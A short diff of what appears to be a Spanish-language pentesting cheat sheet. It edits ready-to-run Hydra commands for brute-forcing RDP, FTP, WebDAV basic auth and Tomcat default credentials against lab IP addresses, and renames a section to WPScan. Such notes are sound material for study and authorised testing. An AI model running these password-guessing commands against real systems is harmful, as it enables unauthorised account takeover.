@@ -37,7 +37,7 @@ hydra -L users.txt -P passwords.txt -t 3 -s 21 <IP> ftp
 </div>
 
 ~~~bash
-hydra -V -f -L users.txt -P passwords.txt rdp://192.168.1.100 -o rdp-creds.txt
+hydra -f -l Administrator -P /usr/share/wordlists/rockyou.txt -o rdp-creds.txt rdp://10.11.1.221
 ~~~
 
 <div class="grid">
@@ -79,10 +79,10 @@ hydra -L users.txt -P passwords.txt 192.168.1.100 http-head /webdav/ -o http-cre
 hydra -C /usr/share/seclist/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 192.168.1.100 http-get /webauth 
 ~~~
 
-<h2><b>Otras herramientas</b></h2>
+<h2><b>WPScan</b></h2>
 
 <div class="grid">
-  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP - WPscan</div>
+  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP</div>
 </div>
 
 ~~~bash
